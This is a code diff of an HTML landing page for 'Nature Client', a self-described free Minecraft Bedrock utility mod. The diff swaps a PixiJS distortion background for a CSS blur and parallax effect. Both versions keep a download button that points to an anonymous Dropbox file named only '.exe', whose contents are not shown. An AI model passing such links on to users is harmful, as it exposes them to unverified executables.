@@ -3,135 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nature Client - Distortion Effect</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.2.4/pixi.min.js"></script>
+    <title>Nature Client</title>
     <style>
+        /* 黒い枠を完全に消す設定 */
         body, html {
             margin: 0;
             padding: 0;
             width: 100%;
             height: 100%;
             overflow: hidden;
-            background-color: #000;
-            font-family: 'Segoe UI', sans-serif;
+            background-color: #0d1117; /* 万が一の時の背景色 */
             display: flex;
             justify-content: center;
             align-items: center;
+            color: white;
+            font-family: 'Segoe UI', sans-serif;
         }
 
-        /* WebGLを表示するキャンバス */
-        #canvas-container {
+        /* 背景：画面いっぱいに広げてぼかす */
+        .bg-container {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
             z-index: -1;
+            overflow: hidden;
         }
 
-        /* コンテンツエリア */
-        .container {
+        .bg-image {
+            width: 110%; /* ぼかしの端を隠すために少し大きく */
+            height: 110%;
+            position: absolute;
+            top: -5%;
+            left: -5%;
+            background: url('背景.png') no-repeat center center;
+            background-size: cover;
+            filter: blur(20px) brightness(0.5);
+            transition: transform 0.1s ease-out; /* ゆがみ演出用 */
+        }
+
+        /* 中央の文字とボタン */
+        .content {
             text-align: center;
             z-index: 10;
-            pointer-events: none; /* マウスイベントを背景に透過させる */
         }
 
         h1 {
-            font-size: clamp(2rem, 10vw, 4rem);
+            font-size: 4rem;
             margin: 0;
-            color: white;
-            text-shadow: 0 0 20px rgba(0,0,0,0.5);
+            letter-spacing: 2px;
+            background: linear-gradient(to bottom, #fff, #ff99cc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        .description {
-            color: rgba(255, 255, 255, 0.7);
-            margin-bottom: 30px;
+        .subtitle {
+            font-size: 1.2rem;
+            color: #aaa;
+            margin-bottom: 40px;
+        }
+
+        /* グラデーションボタン */
+        .btn-group {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
         }
 
         .btn {
-            display: inline-block;
-            padding: 15px 45px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            color: white;
-            text-decoration: none;
-            background: linear-gradient(135deg, #a78bfa 0%, #f472b6 100%);
+            padding: 15px 35px;
             border-radius: 10px;
-            pointer-events: auto; /* ボタンだけはクリック可能にする */
+            text-decoration: none;
+            color: white;
+            font-weight: bold;
+            font-size: 1rem;
+            background: linear-gradient(135deg, #a78bfa 0%, #f472b6 100%);
+            box-shadow: 0 4px 15px rgba(167, 139, 250, 0.4);
             transition: 0.3s;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 25px rgba(244, 114, 182, 0.6);
         }
     </style>
 </head>
 <body>
 
-    <div id="canvas-container"></div>
+    <div class="bg-container">
+        <div class="bg-image" id="bg"></div>
+    </div>
 
-    <div class="container">
+    <div class="content">
         <h1>Nature Client</h1>
-        <p class="description">The best minecraft bedrock free utility mod</p>
-        <a href="https://www.dropbox.com/scl/fi/jhjaiww74lcgo741zqnng/.exe?rlkey=tv4zztnvfql4sd4c4nfsncioz&st=vwymdduv&dl=1" class="btn">
-            Download Now
-        </a>
+        <p class="subtitle">The best minecraft bedrock free utility mod</p>
+        
+        <div class="btn-group">
+            <a href="https://www.dropbox.com/scl/fi/jhjaiww74lcgo741zqnng/.exe?rlkey=tv4zztnvfql4sd4c4nfsncioz&st=vwymdduv&dl=1" class="btn">Download</a>
+            <a href="#" class="btn" style="filter: hue-rotate(45deg);">Discord</a>
+        </div>
     </div>
 
     <script>
-        // 設定
-        const imgUrl = '背景.png'; // あなたの背景画像
-
-        const app = new PIXI.Application({
-            width: window.innerWidth,
-            height: window.innerHeight,
-            resizeTo: window
-        });
-        document.getElementById('canvas-container').appendChild(app.view);
-
-        // 背景スプライト作成
-        const container = new PIXI.Container();
-        app.stage.addChild(container);
-
-        const bg = PIXI.Sprite.from(imgUrl);
-        bg.anchor.set(0.5);
-        bg.x = app.screen.width / 2;
-        bg.y = app.screen.height / 2;
-        
-        // 画面に合わせる（cover）
-        const scale = Math.max(app.screen.width / bg.width, app.screen.height / bg.height);
-        bg.scale.set(scale * 1.1); // ぼかしで見える端を隠すため少し大きく
-        container.addChild(bg);
-
-        // ぼかしフィルタ
-        const blurFilter = new PIXI.BlurFilter();
-        blurFilter.blur = 15;
-        bg.filters = [blurFilter];
-
-        // 歪み（Displacement）フィルタの設定
-        // 歪みの元になる「波紋」の画像を作成
-        const displacementSprite = PIXI.Sprite.from('https://pixijs.com/assets/pixi-filters/displacement_map_repeat.jpg');
-        displacementSprite.texture.baseTexture.wrapMode = PIXI.WRAP_MODES.REPEAT;
-        const displacementFilter = new PIXI.DisplacementFilter(displacementSprite);
-        displacementFilter.scale.set(0); // 最初は歪みゼロ
-
-        app.stage.addChild(displacementSprite);
-        bg.filters.push(displacementFilter);
-
-        // マウスの動きに合わせて歪ませる
-        window.addEventListener('mousemove', (e) => {
-            const posX = e.clientX;
-            const posY = e.clientY;
-            
-            // マウス位置に歪みの中心を移動
-            displacementSprite.x = posX;
-            displacementSprite.y = posY;
-            
-            // 歪みの強さを設定
-            displacementFilter.scale.set(30); 
-        });
-
-        // アニメーションで常に少し揺らす
-        app.ticker.add(() => {
-            displacementSprite.x += 1;
-            displacementSprite.y += 1;
+        // カーソルに合わせて背景を「ゆがませる（少し動かす）」演出
+        const bg = document.getElementById('bg');
+        document.addEventListener('mousemove', (e) => {
+            const x = (window.innerWidth / 2 - e.pageX) / 25;
+            const y = (window.innerHeight / 2 - e.pageY) / 25;
+            bg.style.transform = `translate(${x}px, ${y}px) scale(1.1)`;
         });
     </script>
+
 </body>
 </html>
